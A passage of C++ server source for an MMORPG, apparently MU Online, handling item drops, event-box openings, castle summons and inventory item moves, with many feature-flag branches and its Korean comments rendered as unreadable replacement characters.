					break;
				case 5:
					{
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
						LogAddTD("[Hidden TreasureBox Event] [%s][%s] Throw Surprise Treasure Box - serial:%u",
#else
						LogAddTD("[Hidden TreasureBox Event] [%s][%s] Throw Surprise Treasure Box - serial:%d",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
							lpObj->AccountID,
							lpObj->Name,
							s_num
							);

						gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
						pResult.Result = 0x01;
						
						// �������� ��ǰ ��÷ Ȯ��
						if (rand()%10000 < g_iHiddenTreasureBoxOfflineRate) {
							// �������� ��ǰ ���
							EGReqRegHTOfflineGift(lpObj->m_Index);
						}
						else {
							// ������ ����
							INT iDropZen = 1000000;
							MapC[lpObj->MapNumber].MoneyItemDrop(iDropZen, lpObj->X, lpObj->Y);

							LogAddTD("[Hidden TreasureBox Event] [%s][%s] Event ZenDrop : %d : (%d)(%d/%d)", 
									lpObj->AccountID, lpObj->Name, 
									iDropZen,
									lpObj->MapNumber, lpObj->X, lpObj->Y);
						}
					}
					break;
				}
			}
#endif
#ifdef RING_EVENT_ITEMBOX_20031124		// ����� ������ 40���� ���ϴ� ���� �� ����
			else if( type == MAKE_ITEMNUM(13,20) && level == 1)
			{
				// ���� ������ �´�.
	#ifndef FOR_ONAIR	// ��ۿ뿡���� ���� üũ�� ���Ѵ�
				if (gObj[aIndex].Level >= 40) 
	#endif
				{
					gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);

#ifdef UPDATE_LOWLEVEL_SUPPORT_RING_20070119	// ���, ����(������ ��)�� ���� �߰�/����(goni)
					RingOfHeroEventItemBoxOpen(&gObj[aIndex]);
#else
					RingEventItemBoxOpen (&gObj[aIndex]);		
#endif
				}
	#ifndef FOR_ONAIR
				else 
				{
				
				#ifdef MODIFY_NOTICE_20040325
					PMSG_NOTICE	pNotice;
					TNotice::MakeNoticeMsg( &pNotice, TNOTICE_PRIORITY_LV1, lMsg.Get(1211) );
					TNotice::SetNoticeProperty(&pNotice, TNOTICE_PRIORITY_LV1, TNOTICE_COLOR_BLUE);
					TNotice::SendNoticeToUser( aIndex, &pNotice );
				#else
					GCServerMsgStringSend (lMsg.Get(1211), aIndex, 0);		// "���� 40 �̻��� �Ǿ�� ������ ���� �� �ֽ��ϴ�."
				#endif

					pResult.Result = 0x00;
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
					return FALSE;

				}
	#endif
			}	
#endif
#ifdef FRIENDSHIP_EVENT_RING_BOX_20040211		// ��ģ�� �̺�Ʈ - ������ ������ ���� 80���ϴ� ���� �� ����
			else if( type == MAKE_ITEMNUM(13,20) && level == 2)
			{
				// ������ ������ �´�.
	#ifndef FOR_ONAIR	// ��ۿ뿡���� ���� üũ�� ���Ѵ�
				if (gObj[aIndex].Level >= 80) 
	#endif
				{
					gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
					FriendShipItemBoxOpen (&gObj[aIndex]);		
				}
	#ifndef FOR_ONAIR
				else 
				{

				#ifdef MODIFY_NOTICE_20040325
					PMSG_NOTICE	pNotice;
					TNotice::MakeNoticeMsg( &pNotice, TNOTICE_PRIORITY_LV1, lMsg.Get(1215) );
					TNotice::SetNoticeProperty(&pNotice, TNOTICE_PRIORITY_LV1, TNOTICE_COLOR_BLUE);
					TNotice::SendNoticeToUser( aIndex, &pNotice );
				#else
					GCServerMsgStringSend (lMsg.Get(1215), aIndex, 0);		// "���� 80 �̻��� �Ǿ�� ������ ���� �� �ֽ��ϴ�."
				#endif

					pResult.Result = 0x00;
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
					return FALSE;
				}
	#endif
			}	
#endif
#ifdef MU_CHN_THANKS_RING_EVENT_20040908		// �߱� �̺�Ʈ - ������ ���� 
			else if( type == MAKE_ITEMNUM(13,20) && level == 3)
			{
				pResult.Result = 0x00;
				DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
				return FALSE;
			}
#endif
#ifdef ADD_NEW_MAP_KALIMA_20040518				// �Ҿ���� ������ ������ ������ �����.
			else if( type == MAKE_ITEMNUM(14, 28) ) {

#ifdef MODIFY_KALIMA_KUNDUNMARK_DROP_01_20040906
				if (g_KalimaGate.CreateKalimaGate(aIndex, level, lpMsg->px, lpMsg->py)) {
#else
				if (g_KalimaGate.CreateKalimaGate(aIndex, lpMsg->px, lpMsg->py)) {
#endif
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
					LogAddTD("[Kalima] [%s][%s] Success to Make Kalima Gate (Lost Kalima Map Serial:%u)", 
#else
					LogAddTD("[Kalima] [%s][%s] Success to Make Kalima Gate (Lost Kalima Map Serial:%d)", 
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
						gObj[aIndex].AccountID, 
						gObj[aIndex].Name,
						gObj[aIndex].pInventory[lpMsg->Ipos].m_Number
						);
					
					// ������ ��ȯ�ϴµ� �����ߴ�.
					gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				}
				else {
					pResult.Result = 0x00;
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
					return FALSE;
				}
			}
#endif
#ifdef JAPAN_1ST_ANIVERSARY_BOX_20040531		// �Ϻ� �� ���� 1�ֳ� ��� ����ǻ��� (����� ���� +1 ~ +5 �� ����)
			else if( type == MAKE_ITEMNUM(14,20) && CHECK_LIMIT(level-1, 5)) {
				// ���� (����ǹ��� +n)
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				Japan1StAnivBoxOpen (&gObj[aIndex], level);
			}
#endif

#ifdef ADD_NEW_MERCENARY_FOR_CASTLE_01_20041214
			// �뺴 ��� ������ ������. (�뺴 ����)
			else if( type == MAKE_ITEMNUM(13,7) )
			{
				INT iMercenaryTypeIndex = 0;

				if( level == 0 )
				{
					iMercenaryTypeIndex = NPC_INDEX_BOWMAN;
				}
				else if( level == 1 )
				{
					iMercenaryTypeIndex = NPC_INDEX_SPEARMAN;
				}

				if( g_CsNPC_Mercenary.CreateMercenary(aIndex, iMercenaryTypeIndex, lpMsg->px, lpMsg->py) )
				{
					// �뺴 ��ȯ ���� �� ������ ����.
					gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				}
				else 
				{
					pResult.Result = 0x00;
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
					return FALSE;
				}

			}
#endif

#ifdef ADD_NEW_WEAPON_FOR_CASTLE_01_20041116
			else if( type == MAKE_ITEMNUM(13,11) ) // ������ ���� ��ȯ, ����� ��ȯ�Ѵ�.
			{
				BOOL bSuccess = FALSE;

				// ����� ��ȯ
				if( level == 0 )
				{
					bSuccess = g_CsNPC_Guardian.CreateGuardian( aIndex );
				}
				// ������ ���� ��ȯ
				else if( level == 1 )
				{
#ifdef CASTLE_NPC_LIFESTONE_WORK_20041208
					bSuccess = g_CsNPC_LifeStone.CreateLifeStone( aIndex );
#endif
				}
				
				if( bSuccess == TRUE )
				{
					gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				}
				else 
				{
					pResult.Result = 0x00;
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
					return FALSE;
				}
			}
#endif

#ifdef UPDATE_GM_FUNCTION_20070228	//  GM �������ڸ� ������
			else if( type == MAKE_ITEMNUM( 14, 52 ) )
			{
				// GM ���� ���� ���
				gObjInventoryDeleteItem( aIndex, lpMsg->Ipos );

				GMPresentBoxItemBagOpen( lpObj );
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
				LogAddTD("[%s][%s][%d]%d/%d Used GM Present Box Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
				LogAddTD("[%s][%s][%d]%d/%d Used GM Present Box Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3 );
			}
#endif
#ifdef PCBANG_POINT_SYSTEM_20070206		// ȥ���� ���ڸ� ������
			else if( type == MAKE_ITEMNUM( 14, 55 ) && level == 0 )
			{
				// �κ��丮���� �������� ����.
				gObjInventoryDeleteItem( aIndex, lpMsg->Ipos );	
				
				BoxOfGreenChaosItemBagOpen( &gObj[aIndex], lpObj->MapNumber, lpObj->X, lpObj->Y );
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
				LogAddTD("[%s][%s][%d]%d/%d Used Box Of Green Chaos Item Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
				LogAddTD("[%s][%s][%d]%d/%d Used Box Of Green Chaos Item Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
				     lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);
			}
			else if( type == MAKE_ITEMNUM( 14, 56 ) && level == 0 )
			{
				// �κ��丮���� �������� ����.
				gObjInventoryDeleteItem( aIndex, lpMsg->Ipos );	
				
				BoxOfRedChaosItemBagOpen( &gObj[aIndex], lpObj->MapNumber, lpObj->X, lpObj->Y );
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
				LogAddTD("[%s][%s][%d]%d/%d Used Box Of Red Chaos Item Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
				LogAddTD("[%s][%s][%d]%d/%d Used Box Of Red Chaos Item Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
				     lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);
			}
			else if( type == MAKE_ITEMNUM( 14, 57 ) && level == 0 )
			{
				// �κ��丮���� �������� ����.
				gObjInventoryDeleteItem( aIndex, lpMsg->Ipos );	
				
				BoxOfPurpleChaosItemBagOpen( &gObj[aIndex], lpObj->MapNumber, lpObj->X, lpObj->Y );
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
				LogAddTD("[%s][%s][%d]%d/%d Used Box Of Purple Chaos Item Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
				LogAddTD("[%s][%s][%d]%d/%d Used Box Of Purple Chaos Item Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
				     lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);
			}
#endif


			else
			{	//
				// �������� ���� �ڸ��� �ִ°�??
				int aAntiLootIndex = aIndex;

				if( ( type >= MAKE_ITEMNUM(14, 0) && type <= MAKE_ITEMNUM(14, 10) ) || 
					type == MAKE_ITEMNUM(4, 7) || 
					type == MAKE_ITEMNUM(4, 15) )
				{
					aAntiLootIndex = -1;
				}

				
#ifdef DARKLORD_WORK
	#ifdef ADD_ITEM_SOCKET_OPTION_EXTEND_20080422
				if( MapC[map_num].ItemDrop(type, level, dur, lpMsg->px, lpMsg->py, Option1, Option2, Option3, NOption, SOption, item_number, aAntiLootIndex, PetLevel, PetExp, ItemEffectEx, SocketOption, SocketBonusOption ) == TRUE )
	#else
		#ifdef ADD_380ITEM_NEWOPTION_20060711
				if( MapC[map_num].ItemDrop(type, level, dur, lpMsg->px, lpMsg->py, Option1, Option2, Option3, NOption, SOption, item_number, aAntiLootIndex, PetLevel, PetExp, ItemEffectEx) == TRUE )
		#else
				if( MapC[map_num].ItemDrop(type, level, dur, lpMsg->px, lpMsg->py, Option1, Option2, Option3, NOption, SOption, item_number, aAntiLootIndex, PetLevel, PetExp) == TRUE )
		#endif // ADD_380ITEM_NEWOPTION_20060711
	#endif // ADD_ITEM_SOCKET_OPTION_EXTEND_20080422
#else	// #ifdef DARKLORD_WORK
				if( MapC[map_num].ItemDrop(type, level, dur, lpMsg->px, lpMsg->py, Option1, Option2, Option3, NOption, SOption, item_number, aAntiLootIndex) == TRUE )
#endif	// #ifdef DARKLORD_WORK
				{   // ������ �����⿡ �����ϸ�..
					gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
					pResult.Result = 0x01;
					if( drop_type == 0 )
					{
#ifdef MODIFY_LOG_SYSTEM_2_3_20060828
						LogAddTD(lMsg.Get(479),
							lpObj->AccountID, 
							lpObj->Name,
							lpObj->MapNumber, 
							lpObj->X, 
							lpObj->Y, 
							s_num, 
							szItemName, 
							type, 
							level, 
							Option1, 
							Option2, 
							Option3,
							(int)dur,
							NewOption[0],
							NewOption[1],
							NewOption[2],
							NewOption[3],
							NewOption[4],
							NewOption[5],
							NewOption[6],
							SOption,
	#ifdef MODIFY_380_ITEM_OPTION_DELETE_AT_DROP_20060919
							ItemEffectEx>>7,
	#else
							ItemEffectEx,
	#endif // MODIFY_380_ITEM_OPTION_DELETE_AT_DROP_20060919
							ItemExOption,
							ItemExLevel
							);
#else
	#ifdef EXTEND_LOG_SYSTEM_03_20060816
		#ifdef ADD_380ITEM_NEWOPTION_20060711
			#ifdef ADD_JEWEL_OF_HARMONY_SYSTEM_20060530
						LogAddTD(lMsg.Get(479),
							lpObj->AccountID, 
							lpObj->Name,
							lpObj->MapNumber, 
							lpObj->X, 
							lpObj->Y, 
							s_num, 
							szItemName, 
							type, 
							level, 
							dur,
							Option1, 
							Option2, 
							Option3,
							NewOption[0],
							NewOption[1],
							NewOption[2],
							NewOption[3],
							NewOption[4],
							NewOption[5],
							NewOption[6],
							SOption,
				#ifdef MODIFY_380_ITEM_OPTION_DELETE_AT_DROP_20060919
							ItemEffectEx>>7,
				#else
							ItemEffectEx,
				#endif // MODIFY_380_ITEM_OPTION_DELETE_AT_DROP_20060919
							ItemExOption,
							ItemExLevel
							);
			#endif // ADD_JEWEL_OF_HARMONY_SYSTEM_20060530
		#endif // ADD_380ITEM_NEWOPTION_20060711
	#else // EXTEND_LOG_SYSTEM_03_20060816
						LogAddTD(lMsg.Get(479),
							lpObj->AccountID, 
							lpObj->Name,
							lpObj->MapNumber, 
							lpObj->X, 
							lpObj->Y, 
							s_num, 
							szItemName, 
							type, 
							level, 
							Option1, 
							Option2, 
							Option3,
							NewOption[0],
							NewOption[1],
							NewOption[2],
							NewOption[3],
							NewOption[4],
							NewOption[5],
							NewOption[6],
							SOption
							);
	#endif // EXTEND_LOG_SYSTEM_03_20060816
#endif // MODIFY_LOG_SYSTEM_2_3_20060828
					}
					else 
					{
#ifdef MODIFY_LOG_SYSTEM_2_3_20060828
						LogAddTD(lMsg.Get(480),
							lpObj->AccountID, 
							lpObj->Name,
							lpObj->MapNumber, 
							lpObj->X, 
							lpObj->Y, 
							s_num, 
							szItemName, 
							type, 
							level, 
							Option1, 
							Option2, 
							Option3,
							(int)dur,
							NewOption[0],
							NewOption[1],
							NewOption[2],
							NewOption[3],
							NewOption[4],
							NewOption[5],
							NewOption[6],
							SOption,
#ifdef UPDATE_ADD_LOG_20080117
							ItemEffectEx>>7,
#else	// UPDATE_ADD_LOG_20080117
							ItemEffectEx,
#endif	// UPDATE_ADD_LOG_20080117
							ItemExOption,
							ItemExLevel
							);
#else
						LogAddTD(lMsg.Get(480),
							lpObj->AccountID, 
							lpObj->Name,
							lpObj->MapNumber, 
							lpObj->X, 
							lpObj->Y, 
							s_num, 
							szItemName, 
							type, 
							level, 
							Option1, 
							Option2, 
							Option3,
							NewOption[0],
							NewOption[1],
							NewOption[2],
							NewOption[3],
							NewOption[4],
							NewOption[5],
							NewOption[6],
							SOption);
#endif

					}


				}
				else
				{
					// ������ ����.
					pResult.Result = 0x00;
				}
			}
		}
		else {
			LogAdd(lMsg.Get(481));
			pResult.Result = 0x00;
		}
		
	}
	
	DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

	if( CopyItem )
	{
		GCItemListSend(aIndex);
	}

	if( pResult.Result == 0x01 )
	{
		// ��� ��ü �ߴٸ� 
		if( lpMsg->Ipos < MAX_EQUIPMENT ) 
		{
			if( lpMsg->Ipos == EQUIPMENT_RING_RIGHT || lpMsg->Ipos == EQUIPMENT_RING_LEFT)
			{
				gObjUseSkill.SkillChangeUse(aIndex);				
			}
			gObjMakePreviewCharSet(aIndex);
			
			PMSG_USEREQUIPMENTCHANGED	pChange;
			
			PHeadSetB((LPBYTE)&pChange, 0x25, sizeof( pChange ));

			pChange.NumberH    = HIBYTE( aIndex );
			pChange.NumberL	   = LOBYTE( aIndex );
						
			//pChange.ItemInfo[0] = (BYTE)lpObj->pInventory[lpMsg->Ipos].m_Type;
			ItemByteConvert(pChange.ItemInfo, lpObj->pInventory[lpMsg->Ipos]);
			pChange.ItemInfo[1] = lpMsg->Ipos<<4;
			pChange.ItemInfo[1]|= LevelSmallConvert(aIndex, lpMsg->Ipos)&0x0F;

			
			DataSend(aIndex, (LPBYTE)&pChange, pChange.h.size);
			MsgSendV2(lpObj, (LPBYTE)&pChange, pChange.h.size);
		}
	}
	return pResult.Result;
}

// [0x24] ������ �̵� ��� ����
void GCItemMoveResultSend(int aIndex, BYTE result, BYTE pos, BYTE ItemInfo[])
{
	PMSG_INVENTORYITEMMOVE_RESULT	pMsg;

	pMsg.h.c			= PMHCE_BYTE;
	pMsg.h.headcode		= 0x24;
	pMsg.h.size			= sizeof(pMsg);
	pMsg.result			= result;
	pMsg.Pos			= pos;
	pMsg.ItemInfo[0]    = ItemInfo[0];
	pMsg.ItemInfo[1]    = ItemInfo[1];
	pMsg.ItemInfo[2]    = ItemInfo[2];
	pMsg.ItemInfo[3]    = ItemInfo[3];

#if ITEM_BUFFER_SIZE > 4
	pMsg.ItemInfo[4]    = ItemInfo[4];	
#endif

#ifdef ITEM_INDEX_EXTEND_20050706
	pMsg.ItemInfo[5]    = ItemInfo[5];
	pMsg.ItemInfo[6]    = ItemInfo[6];
#endif

#ifdef ADD_ITEM_SOCKET_OPTION_EXTEND_20080422
	pMsg.ItemInfo[7]	= ItemInfo[7];
	pMsg.ItemInfo[8]	= ItemInfo[8];
	pMsg.ItemInfo[9]	= ItemInfo[9];
	pMsg.ItemInfo[10]	= ItemInfo[10];
	pMsg.ItemInfo[11]	= ItemInfo[11];
#endif // ADD_ITEM_SOCKET_OPTION_EXTEND_20080422
	
	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}


#ifdef PERSONAL_SHOP_20040113 

//----------------------------------------------------------------------------
// [0x24] ������ ������ ���� �䱸(�κ��丮���� ������ �̵������� ���)
void CGInventoryItemMove(LPPMSG_INVENTORYITEMMOVE lpMsg, int aIndex)
{
	BYTE result;
	

	BYTE ItemInfo[ITEM_BUFFER_SIZE];
	
	if( PacketCheckTime(&gObj[aIndex]) == FALSE ) 
	{	//GCResultSend(aIndex, 0x24, 0xFF);
		GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
		return;
	}
	if( gObjIsConnectedGP(aIndex) == FALSE ) 
	{
		LogAddC(LOGC_RED, "[%s][%d] error-L3", __FILE__,__LINE__);
		GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
		return;
	}
	
	LPOBJECTSTRUCT	lpObj = &gObj[aIndex];
	int it_type = 0;


#ifdef WAREHOUSE_ITEMCOPY_BUG_FIX
	if( lpObj->m_ReqWarehouseOpen )
	{	// â�� ���� �ִ� �߿��� ������ �̵��� �ȵ�
		LogAddC(LOGC_RED, "[%s][%d] error-L3", __FILE__,__LINE__);
		GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
		return;
	}
#endif

	int source = lpMsg->source_item_num;
	int target = lpMsg->target_item_num;

	if( lpMsg->tFlag == ITEMMOVE_WAREHOUSE || lpMsg->sFlag == ITEMMOVE_WAREHOUSE )		// â���� �̵�
		it_type = I_WAREHOUSE;
	if( lpMsg->tFlag == ITEMMOVE_INVENTORY && lpMsg->sFlag == ITEMMOVE_INVENTORY )		// �κ��丮���� �̵�
		it_type = I_INVENTORY;
#ifdef PERSONAL_SHOP_20040113
	if((lpMsg->tFlag == ITEMMOVE_INVENTORY && lpMsg->sFlag == ITEMMOVE_PSHOPWND ) ||	// ���λ����� �κ��丮���� �̵����� ����.
		(lpMsg->tFlag == ITEMMOVE_PSHOPWND && lpMsg->sFlag == ITEMMOVE_INVENTORY ) ||
		(lpMsg->tFlag == ITEMMOVE_PSHOPWND && lpMsg->sFlag == ITEMMOVE_PSHOPWND ))
		it_type = I_INVENTORY;		// ����Ʈ �������� �̵��� �����̴� �ʿ���ٸ� ������ �ɵ�
#endif
	
#ifdef MODIFY_INVENTORY_ITEM_MOVE_BUGFIX_20071113
	if( lpMsg->tFlag == lpMsg->sFlag
		&& source == target )
	{
		GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
		return;
	}
#endif		
	
	if( gObjCanItemTouch(lpObj, it_type) == FALSE )	// �������� �̵��� �� ���ٸ�
	{
		// ������ ���ÿ� ȭ���� �̵��ǰ� �Ѵ�
		if( lpMsg->sItemInfo[0] == MAKE_ITEMNUM(4, 7) || lpMsg->sItemInfo[0] == MAKE_ITEMNUM(4, 15) )
		{
			if( (target >= MAX_EQUIPMENT || source < MAX_EQUIPMENT) )
			{			
				GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
				return;
			}
		}	
		else
		{
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			return;
		}
	}

#ifdef CHINA_BUG_RETOUCH	
#ifdef ITEM_INDEX_EXTEND_20050706
	int itemtype	= lpMsg->sItemInfo[0]+((lpMsg->sItemInfo[3]&0x80)<<1)+((lpMsg->sItemInfo[5]&0xF0)<<5);
#else
	int itemtype	= lpMsg->sItemInfo[0]+(((lpMsg->sItemInfo[3]&0x80)>>7)*256);
#endif
	if( itemtype == MAKE_ITEMNUM(13, 20) )
	{	// �������� ����  && �������� ������ �κ��丮�������� �̵������ϰ�...
		if( lpMsg->sFlag != ITEMMOVE_INVENTORY || lpMsg->tFlag != ITEMMOVE_INVENTORY )
		{	// �κ��丮 ���� �̵��� �ƴϸ� �̵��Ҽ� ����
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			return;
		}
	}
#endif // CHINA_BUG_RETOUCH


#if TESTSERVER == 1 
	#ifdef DARKLORD_WORK
		{
#ifdef ITEM_INDEX_EXTEND_20050706
			int itemtype	= lpMsg->sItemInfo[0]+((lpMsg->sItemInfo[3]&0x80)<<1)+((lpMsg->sItemInfo[5]&0xF0)<<5);
#else
			int itemtype	= lpMsg->sItemInfo[0]+(((lpMsg->sItemInfo[3]&0x80)>>7)*256);
#endif
			if( itemtype == MAKE_ITEMNUM(13, 4) || itemtype == MAKE_ITEMNUM(13, 5) )
			{
				if( lpMsg->sFlag == ITEMMOVE_INVENTORY )
				{
					DebugOutput(aIndex, "[%s] Lv:%d Exp:%d", 
							lpObj->pInventory[source].GetName(),				
							lpObj->pInventory[source].m_PetItem_Level, 
							lpObj->pInventory[source].m_PetItem_Exp);
				}
				else if( lpMsg->sFlag == ITEMMOVE_WAREHOUSE )
				{
					DebugOutput(aIndex, "[%s] Lv:%d Exp:%d", 
								lpObj->pWarehouse[source].GetName(),				
								lpObj->pWarehouse[source].m_PetItem_Level, 
								lpObj->pWarehouse[source].m_PetItem_Exp);
				}
			}
		}
	#endif
#endif

	if( lpObj->DieRegen ) 
	{
		// �׾� �ִ� �߿��� ����� �Ұ��� �ϴ�.
		GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
		return;
	}
	
	ItemInfo[0] = lpMsg->sItemInfo[0];
	ItemInfo[1] = lpMsg->sItemInfo[1];
	ItemInfo[2] = lpMsg->sItemInfo[2];
	ItemInfo[3] = lpMsg->sItemInfo[3];

#if ITEM_BUFFER_SIZE > 4
	ItemInfo[4] = lpMsg->sItemInfo[4];
#endif

#ifdef ITEM_INDEX_EXTEND_20050706
	ItemInfo[5] = lpMsg->sItemInfo[5];
	ItemInfo[6] = lpMsg->sItemInfo[6];
#endif

#ifdef ADD_ITEM_SOCKET_OPTION_EXTEND_20080422
	ItemInfo[7]		= lpMsg->sItemInfo[7];
	ItemInfo[8]		= lpMsg->sItemInfo[8];
	ItemInfo[9]		= lpMsg->sItemInfo[9];
	ItemInfo[10]	= lpMsg->sItemInfo[10];
	ItemInfo[11]	= lpMsg->sItemInfo[11];
#endif // ADD_ITEM_SOCKET_OPTION_EXTEND_20080422

	if( lpMsg->sFlag == ITEMMOVE_CHAOSBOX || lpMsg->tFlag == ITEMMOVE_CHAOSBOX )		// ī�����ڽ� ������� �ƴҶ� ������ �̵��� �ȵǰ�..
	{
		if( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type != I_CHAOSBOX ) 
		{
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			LogAdd("[%s][%s] error-L1 : used not Chaosbox", gObj[aIndex].AccountID, gObj[aIndex].Name);
			return;
		}
		if( lpObj->ChaosLock == TRUE )	// �ͽ� ���̸� �̵��� �ȵǰ�..
		{
			LogAddTD("[%s][%s] error-L3 : CBMixing", gObj[aIndex].AccountID, gObj[aIndex].Name);
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			return;
		}
	}

#ifdef DARKLORD_WORK		// ���û��ʵ� ������ ī���� ���հ� ���� ó�� �Ѵ�
	if( lpMsg->sFlag == ITEMMOVE_DARK_TRAINER || lpMsg->tFlag == ITEMMOVE_DARK_TRAINER )		// ī�����ڽ� ������� �ƴҶ� ������ �̵��� �ȵǰ�..
	{
		if( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type != I_DARK_TRAINER ) 
		{
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			LogAdd("[%s][%s] error-L1 : used not DarkTrainerBox", gObj[aIndex].AccountID, gObj[aIndex].Name);
			return;
		}
		if( lpObj->ChaosLock == TRUE )	// �ͽ� ���̸� �̵��� �ȵǰ�..
		{
			LogAddTD("[%s][%s] error-L3 : DarkTrainerBoxMixing", gObj[aIndex].AccountID, gObj[aIndex].Name);
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			return;
		}
	}
#endif

#ifdef ADD_JEWEL_OF_HARMONY_SYSTEM_20060530	
	// ��ȭ�Ǻ��� ��ȭ / ���ü� ���� / ��ȭ������ ȯ��
	if( lpMsg->sFlag == ITEMMOVE_JEWELOFHARMONY_PURITY	|| 
		lpMsg->sFlag == ITEMMOVE_JEWELOFHARMONY_SMELT	|| 
		lpMsg->sFlag == ITEMMOVE_JEWELOFHARMONY_RESTORE || 
		lpMsg->tFlag == ITEMMOVE_JEWELOFHARMONY_PURITY ||
		lpMsg->tFlag == ITEMMOVE_JEWELOFHARMONY_SMELT ||
		lpMsg->tFlag == ITEMMOVE_JEWELOFHARMONY_RESTORE 
		)
	{
		if( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type != I_CHAOSBOX ) 
		{
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			LogAdd("[%s][%s] error-L1 : used not ChaosBox", gObj[aIndex].AccountID, gObj[aIndex].Name);
			return;
		}
		if( lpObj->ChaosLock == TRUE )	// �ͽ� ���̸� �̵��� �ȵǰ�..
		{
			LogAddTD("[%s][%s] error-L3 : JewelOfHarmony Mixing", gObj[aIndex].AccountID, gObj[aIndex].Name);
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			return;
		}
	}
#endif	// ADD_JEWEL_OF_HARMONY_SYSTEM_20060530

#ifdef ADD_PCS_LOTTERY_SYSTEM_20070117
	if( lpMsg->sFlag == ITEMMOVE_LOTTERY_MIX || lpMsg->tFlag == ITEMMOVE_LOTTERY_MIX )
	{
		if( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type != I_CHAOSBOX ) 
		{
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			LogAdd("[%s][%s] error-L1 : used not ChaosBox", gObj[aIndex].AccountID, gObj[aIndex].Name);
			return;
		}
		if( lpObj->ChaosLock == TRUE )	// �ͽ� ���̸� �̵��� �ȵǰ�..
		{
			LogAddTD("[%s][%s] error-L3 : JewelOfHarmony Mixing", gObj[aIndex].AccountID, gObj[aIndex].Name);
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			return;
		}
	}
#endif // ADD_PCS_LOTTERY_SYSTEM_20070117
	
#ifdef ADD_ITEM_SOCKET_OPTION_MIX_20080415
	if( lpMsg->sFlag == ITEMMOVE_SOCKET_ITEM_EXTRACT
		|| lpMsg->sFlag == ITEMMOVE_SOCKET_ITEM_COMPOSIT
		|| lpMsg->sFlag == ITEMMOVE_SOCKET_ITEM_EQUIP
		|| lpMsg->sFlag == ITEMMOVE_SOCKET_ITEM_REMOVE
		|| lpMsg->tFlag == ITEMMOVE_SOCKET_ITEM_EXTRACT
		|| lpMsg->tFlag == ITEMMOVE_SOCKET_ITEM_COMPOSIT
		|| lpMsg->tFlag == ITEMMOVE_SOCKET_ITEM_EQUIP
		|| lpMsg->tFlag == ITEMMOVE_SOCKET_ITEM_REMOVE
	  )
	{
		if( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type != I_CHAOSBOX ) 
		{
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			LogAdd("[%s][%s] error-L1 : used not ChaosBox", gObj[aIndex].AccountID, gObj[aIndex].Name);
			return;
		}
		if( lpObj->ChaosLock == TRUE )	// �ͽ� ���̸� �̵��� �ȵǰ�..
		{
			LogAddTD("[%s][%s] error-L3 : SocketItem Mixing", gObj[aIndex].AccountID, gObj[aIndex].Name);
